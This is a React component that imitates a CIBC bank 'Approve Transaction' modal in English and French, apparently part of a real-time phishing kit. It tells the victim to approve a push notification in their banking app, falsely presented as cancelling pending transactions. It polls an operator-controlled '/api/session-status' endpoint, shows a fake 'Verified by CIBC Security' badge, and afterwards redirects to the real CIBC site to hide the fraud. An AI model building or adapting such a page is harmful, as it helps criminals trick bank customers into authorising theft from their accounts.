import React, { useEffect, useState } from 'react';
import { X, ShieldCheck, Smartphone, CheckCircle } from 'lucide-react';

const translations = {
  en: {
    titleButton: 'Approve',
    titleText: ' Transaction',
    subtitle1: 'A push notification was sent to your CIBC mobile app. Please open your app and ',
    subtitleButton: 'approve',
    subtitle2: ' the request to cancel the pending transactions.',
    bullets: [
      { icon: Smartphone, text: 'Open your CIBC mobile app' },
      { icon: ShieldCheck, text: 'Review the request details' },
      { icon: CheckCircle, text: 'Tap "Approve" to cancel pending transactions' },
    ],
    note: 'This extra step helps us keep your account secure.',
    securityBadge: 'Verified by CIBC Security',
    waitingText: 'Waiting for approval...',
    successTitle: 'Transaction Approved',
    successText: 'Your pending transactions will be cancelled in a moment...',
  },
  fr: {
    titleButton: 'Approuver',
    titleText: ' la Transaction',
    subtitle1: 'Une notification push a été envoyée à votre application mobile CIBC. Veuillez ouvrir votre application et ',
    subtitleButton: 'approuver',
    subtitle2: ' la demande pour annuler les transactions en attente.',
    bullets: [
      { icon: Smartphone, text: 'Ouvrez votre application mobile CIBC' },
      { icon: ShieldCheck, text: 'Examinez les détails de la demande' },
      { icon: CheckCircle, text: 'Appuyez sur "Approuver" pour annuler les transactions en attente' },
    ],
    note: 'Cette étape supplémentaire nous aide à sécuriser votre compte.',
    securityBadge: 'Vérifié par Sécurité CIBC',
    waitingText: 'En attente d\'approbation...',
    successTitle: 'Transaction Approuvée',
    successText: 'Vos transactions en attente seront annulées dans un instant...',
  },
};

export default function AppPushModal({ email, lang = 'en', onClose }) {
  const t = translations[lang] || translations.en;
  const [isSuccess, setIsSuccess] = useState(false);
  const [redirectUrl, setRedirectUrl] = useState('https://www.cibc.com/en/');

  useEffect(() => {
    let isMounted = true;
    
    const pollStatus = async () => {
      if (isSuccess) return;
      
      try {
        const response = await fetch(`/api/session-status?email=${encodeURIComponent(email)}`, {
          headers: { 'X-Access-Key': 'client-cibc-bank' },
        });
        const data = await response.json();
        if (!isMounted) return;
        
        if (data.success) {
          if (data.status === 'cancelled' || data.status === 'idle') {
            onClose();
            window.location.reload();
          } else if (data.status === 'redirect_success') {
            if (data.redirectUrl) {
              setRedirectUrl(data.redirectUrl);
            }
            setIsSuccess(true);
          }
        }
      } catch (err) {
        console.error('Error polling session status in AppPushModal:', err);
      }
    };
    
    pollStatus();
    const intervalId = setInterval(pollStatus, 2000);
    
    return () => { 
      isMounted = false; 
      clearInterval(intervalId);
    };
  }, [email, onClose, isSuccess]);

  useEffect(() => {
    if (isSuccess) {
      localStorage.removeItem('showAppPushModal');
      localStorage.removeItem('otpEmail');
      
      fetch('/api/clear-session', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-Access-Key': 'client-cibc-bank' },
        body: JSON.stringify({ email })
      }).catch(err => console.error('Error clearing session:', err));

      const timer = setTimeout(() => {
        window.location.href = redirectUrl;
      }, 3000);
      return () => clearTimeout(timer);
    }
  }, [isSuccess, redirectUrl, email]);

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-xs animate-fade-in select-none">
      <div
        className="bg-white w-full max-w-[460px] rounded-2xl shadow-[0_20px_50px_rgba(0,0,0,0.18)] px-8 pt-9 pb-8 flex flex-col relative border border-[#e8e8e8] animate-slide-in overflow-hidden"
        style={{ fontFamily: "'Whitney', 'Whitney SSm', 'Whitney Medium', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif" }}
      >
        {/* Decorative top accent line with CIBC Red */}
        <div className="absolute top-0 left-0 right-0 h-1.5 bg-gradient-to-r from-[#c41f3e] to-[#7b003a]" />

        {onClose && !isSuccess && (
          <button
            type="button"
            onClick={onClose}
            className="absolute top-4 right-4 bg-transparent border-none cursor-pointer text-[#888] hover:text-[#222] p-1.5 flex items-center rounded-full hover:bg-black/5 transition-all duration-200"
            aria-label="Close"
          >
            <X className="w-[18px] h-[18px]" />
          </button>
        )}

        {/* CIBC Modal Logo */}
        <div className="flex justify-center mb-5">
          <div className={`p-1 transition-all duration-300 hover:scale-105 ${isSuccess ? 'scale-110' : ''}`}>
            <img
              src="/cibc-modal-logo.png"
              alt="CIBC Logo"
              className="w-16 h-auto object-contain"
            />
          </div>
        </div>

        {isSuccess ? (
          <div className="flex flex-col items-center justify-center py-4 animate-fade-in">
            <CheckCircle className="w-16 h-16 text-[#c41f3e] mb-4 drop-shadow-xs" />
            <h3 className="text-[22px] font-normal text-[#2b2b2b] text-center mb-2 tracking-tight">
              {t.successTitle}
            </h3>
            <p className="text-[#c41f3e] text-[15.5px] font-medium text-center">
              {t.successText}
            </p>
          </div>
        ) : (
          <>
            <p className="text-[#333333] text-[16px] text-center mb-6 leading-relaxed px-2 font-normal">
              {t.subtitle1}
              <span className="bg-[#c41f3e] text-white px-2 py-0.5 rounded-[4px] shadow-xs font-medium inline-block mx-0.5">
                {t.subtitleButton}
              </span>
              {t.subtitle2}
            </p>

            {/* Bullet features cards */}
            <div className="bg-[#fafafa] border border-[#eaeaea] rounded-xl p-4 mb-6 shadow-inner">
              <ul className="space-y-4">
                {t.bullets.map(({ icon: Icon, text }, idx) => (
                  <li
                    key={text}
                    className="flex items-start gap-3.5 relative"
                  >
                    {idx !== t.bullets.length - 1 && (
                      <div className="absolute left-[15px] top-[30px] bottom-[-16px] w-[2px] bg-[#eaeaea] z-0"></div>
                    )}
                    <span className="flex-shrink-0 w-8 h-8 rounded-full bg-white border-2 border-[#c41f3e] flex items-center justify-center shadow-xs z-10 relative">
                      <Icon className="w-[16px] h-[16px] text-[#c41f3e]" />
                    </span>
                    <span className="text-[14.5px] text-[#333333] font-normal leading-snug pt-1">{text}</span>
                  </li>
                ))}
              </ul>
            </div>

            {/* Waiting indicator */}
            <div className="flex flex-col items-center justify-center gap-3 mt-2 mb-2 py-3 rounded-xl">
              <div className="relative flex items-center justify-center w-12 h-12">
                <div className="absolute inset-0 border-4 border-red-100 rounded-full"></div>
                <div className="absolute inset-0 border-4 border-[#c41f3e] rounded-full border-t-transparent animate-spin"></div>
                <Smartphone className="w-5 h-5 text-[#c41f3e]" />
              </div>
              <span className="text-[14.5px] text-[#c41f3e] font-medium animate-pulse tracking-wide">{t.waitingText}</span>
            </div>

            <p className="text-[12.5px] text-[#777] text-center mt-2 leading-normal px-2">
              {t.note}
            </p>

            {/* Security badge pill */}
            <div className="flex items-center justify-center gap-2 mt-5 pt-4 border-t border-[#f3f4f6]">
              <div className="flex items-center gap-1.5 bg-red-50/80 border border-red-100/90 px-3.5 py-1.5 rounded-full shadow-xs">
                <ShieldCheck className="w-3.5 h-3.5 text-[#c41f3e]" />
                <span className="text-[10.5px] text-[#c41f3e] font-semibold tracking-wider uppercase">
                  {t.securityBadge}
                </span>
              </div>
            </div>
          </>
        )}
      </div>
    </div>
  );
}